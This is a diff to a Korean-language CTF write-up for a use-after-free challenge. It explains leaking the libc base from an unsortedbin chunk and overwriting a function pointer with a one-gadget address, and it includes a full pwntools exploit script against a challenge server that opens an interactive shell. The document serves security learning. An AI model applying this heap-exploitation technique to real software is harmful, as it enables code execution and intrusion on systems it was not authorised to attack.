@@ -248,6 +248,8 @@ if (idx < 10 && custom[idx]) {
 
 이 부분을 `LD_PRELOAD`와 `LD_LIBRARY_PATH`로 설정해야 한다고 했는데, 이 부분이 힘들어서 일단은 강의자료의 오프셋과 `size`의 입력 값인 `1280`을 써서 할 예정이다. 나중에 수정하자.
 
+그리고, Docker 공부도 하자..
+
 ```
 pwndbg> vmmap
 LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
@@ -293,3 +295,133 @@ $1 = 0x3ebca0
 
 # Exploit 
 
+## 1. Leak libc base
+
+앞에서, `custom_func`를 여러번 호출하여 2개의 청크를 할당한 후 첫번째 청크만 `free`해서 남아있는 `fd`와 `bk` 값을 Leak하여 gdb에서 `libc base`와의 오프셋을 미리 구한 후, 현재 바이너리에 매핑된 `libc base`의 오프셋을 구할 수 있다고 하였다.
+
+그럼, 먼저 `payload`로 `custom_func`를 3번 호출하여, 아래와 같이 3단계를 거치면 될 것이다.
+
+1. `1280(0x500)` 크기의 청크 할당 후, `free idx`는 `-1`으로 보내서 `free`하지 않기
+
+2. `1280(0x500)` 크기의 청크 할당 후, `free idx`는 `0`으로 보내서 첫 번째 청크를 해제하여 `unsortedbin`에 저장
+
+3. `1280(0x500)` 크기의 청크를 할당하여, `2.`에서 `free`한 청크를 `unsortedbin`에서 꺼내서 해당 청크에 존재하는 `fd` 값을 읽어오기
+
+![image](https://github.com/user-attachments/assets/8d78e688-448f-4fdf-a46e-e9cace09fbf2)
+
+청크의 구조는 위 이미지와 같기 때문에 `custom_func`에서 `printf("Data: %s\n", custom[c_idx]);`로 청크의 `data`를 Leak 하면 초기화되지 않은 `fd` 값이 출력될 것이다.
+
+그럼 여기에, 앞에서 구한 오프셋을 더해주어서 `libc base`의 주소를 Leak 하면 된다.
+
+### 주의할 점
+
+`custom_func`에서는 청크를 할당 후, `read(0, custom[c_idx], size - 1);`를 통해 해당 청크에 데이터를 입력해야한다.
+
+여기서 입력해준 데이터는 `fd`의 값을 낮은 주소부터 덮게 된다. 따라서, 어떤 값을 입력하느냐에 따라 출력되는 값이 달라질 수 있기 때문에 주의해야 한다.
+
+`B`를 입력한 경우, 앞에서 구한 오프셋을 그대로 넣어주면 되지만 `C`를 넣을 경우 아스키 코드 기준으로 1만큼 크기 때문에 앞에서 구한 오프셋에 `+1`을 해줘야 하고, 반대로 `A`를 넣은 경우 `-1`을 해줘야 한다.
+
+### 수정할 부분
+
+근데 여기서 매우 의문점이 `fd`의 값은 `0x7ffff7dcdca0` 이라서 가장 낮은 바이트는 `0xa0`이고, 이를 변조없이 채우려면 오히려 `\xa0`을 전달해줘야 하는데 왜 `B`를 전달해주는지 의문이다.
+
+문제 서버에서는 `B`의 아스키 코드 값대로 가장 하위 비트가 `0x42`라서 그렇다고 치면 항상 서버에서 하위 비트가 `0x42`로 고정되는 이유도 궁금하고, 이걸 어떻게 구할 수 있을지도 궁금하다.
+
+오프셋이 `0x42`로 끝나는데 이게 힌트인가 ?
+
+그리고 그렇다면 이를 없애기 위해 아예 `b'a' * 0x8`를 전달해서 `b'a' * 0x8`은 `p.recvuntil(b'a'*0x8)`으로 버리고 뒤의 `bk`를 받으면 되는데 이렇게 하면 왜 안되는지도 의문이다.
+
+### 참고
+
+1. 세 번째로 입력하는(마지막에 입력해주는) `data`외에는 첫 번째와 두 번째에 입력하는 데이터 값은 아무 값이나 입력해줘도 상관 없다. 두 번째 데이터는 참조하지도 않고, 첫 번째 데이터는 어쩌피 `fd`와 `bk`로 덮어씌워지기 때문이다.
+
+2. 할당하는 메모리의 `size`도 `1040bytes`만 넘으면 다 정상적으로 익스플로잇이 되었다. 그리고 첫 번째로 전달해주는 `size`와 세 번째로 전달해주는 `size`가 `±8` 차이까지는 상관없었다. 추측하기에, 청크는 `16bytes` 단위로 할당되고 `header`까지 생각했을 때 대충 `±8` 까지는 되는 것 같다.
+
+## 2. `fptr` Overwrite
+
+이제 `libc base`의 값을 구했기 때문에 `libc base`에 원가젯의 주소를 더해서, `human_func` 함수에서 `human->age`에 해당 주소를 대입해주면 된다.
+
+그 후 바로 `robot_func` 함수를 호출하면, `human->age`에 남아있는 데이터가 `robot->fptr` 위치와 같아지게 되어 `robot->fptr`에서 원가젯을 호출하게 될 것이다.
+
+### 수정할 점
+
+근데 여기서 원가젯이 아래와 같은데, gdb를 통해 `robot_func`에서 `if (robot->fptr)` 전에 중단점을 잡고 모든 원가젯 조건을 확인해봐도 맞는 조건이 없는데, 실제로는 `[rsp + 0x70] == NULL` 조건의 원가젯으로 익스플로잇이 된다.
+
+원가젯 조건 판단하는 방법을 좀 더 공부해봐야겠다.
+
+![image](https://github.com/user-attachments/assets/9e5bc2f6-8fae-4b8c-aada-15fdf0bfdf69)
+
+
+### 주의할 점
+
+`human_func`, `robot_func`, `custom_func`는 전부 `data`를 입력 받을 때 빼고, 전부 `scanf("%d")`로 입력을 받기 때문에 `p.sendline(str().encode)`으로 입력을 보내줘야 한다.
+
+`custom_func`에서 `data`를 입력 받을 때만 오직 `read`로 입력 받기 때문에 개행 문자를 추가해주면 `fd`에 `\xa0`가 추가되서 `send`로 보내야 한다.
+
+**그리고, 제일 마지막에 `printf("Data: %s\n", custom[c_idx]);`를 통해 청크의 `data`를 읽어야 하기 때문에 각 함수에서 페이로드를 보낼 때, `sendlineafter`를 통해 보내야 한다.** 
+
+그렇게 하지 않으면, `u64(p.recvline()[:-1].ljust(8, b'\x00'))`에서 마지막에 `data`를 입력 받울 때 바이너리의 형식적인 `printf("Size: ");` 같은 출력값들이 섞여서 제대로 출력이 안되게 된다.
+
+`human`, `robot`에는 꼭 해줄 필요가 없긴 하지만, `custom`에는 꼭 해줘야 한다.
+
+`custom`에서 페이로드를 3번 보내는데, 이때 전부 `after(b': ', ...)`을 통해 보내면 차례대로 나오는 `printf("Size: ");`, `printf("Data: ");`, `printf("Data: %s\n", custom[c_idx]);`, `printf("Free idx: ");` 중 딱 세번째 `printf`의 `: `까지 짤려서,
+
+`%s\n`을 통해 바로 `data\n`이 출력되고, `recvline()`으로 받을 수 있게 된다. (뒤에 `printf("Free idx: ");`가 출력되므로 신경쓸 필요 없어짐)
+
+참고로, `sendafter(b': ')`는 `": : :"`라는 문자열에서 처음 `":"`를 만나면 바로 보낸다.
+
+```
+#!/usr/bin/env python3
+# Name: uaf_overwrite.py
+from pwn import *
+
+p = remote("host3.dreamhack.games", 11995)
+
+
+def human(weight, age):
+    p.sendlineafter(b'>', b'1')
+    p.sendlineafter(b': ', str(weight).encode())
+    p.sendlineafter(b': ', str(age).encode())
+    # p.sendline(str(weight).encode())
+    # p.sendline(str(age).encode())
+
+
+def robot(weight):
+    p.sendlineafter(b'>', b'2')
+    p.sendlineafter(b': ', str(weight).encode())
+    # p.sendline(b'2')
+    # p.sendline(str(weight).encode())
+
+
+def custom(size, data, idx):
+    p.sendlineafter(b'>', b'3')
+    p.sendlineafter(b': ', str(size).encode())
+    # 여긴 `scanf`가 아닌 `read`로 입력 받기 때문에 `send`로 보내야 함
+    # 만약 `sendline`으로 보내면 data에 `\n`이 추가되서 출력되는 `data` 값이 달라져서 offset도 달라짐
+    p.sendafter(b': ', data)
+    p.sendlineafter(b': ', str(idx).encode())
+    # p.sendline(b'3')
+    # p.sendline(str(size).encode())
+    # p.send(p64(data))
+    # p.sendline(str(idx).encode())
+
+
+# [1] Leak libc base
+custom(0x500, b'random1', -1)  # 사이즈를 8바이트 단위로 `0x4f9 ~ 0x508` 까지는 같은 오프셋을 가리킴
+custom(0x500, b'random2', 0)
+custom(0x500, b'B', -1)
+# data 값이 'B'가 아니라 'C'가 된다면, 아스키코드 기준 1이 커진 값이 입력되므로, offset은 0x3ebc42 가 아니라 0x3ebc43가 되야한다.
+# 반대로 'A'라면, 0x3ebc41이어야 한다.
+
+# custom(0x500, b'a'*0x8, -1)
+# p.recvuntil(b'a'*0x8)
+
+libc_base = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x3ebc42
+og = libc_base + 0x10a41c  # 제약 조건을 만족하는 원가젯
+
+# [2] `robot->fptr` Overwrite
+human(1, og)
+robot(1)
+
+p.interactive()
+```
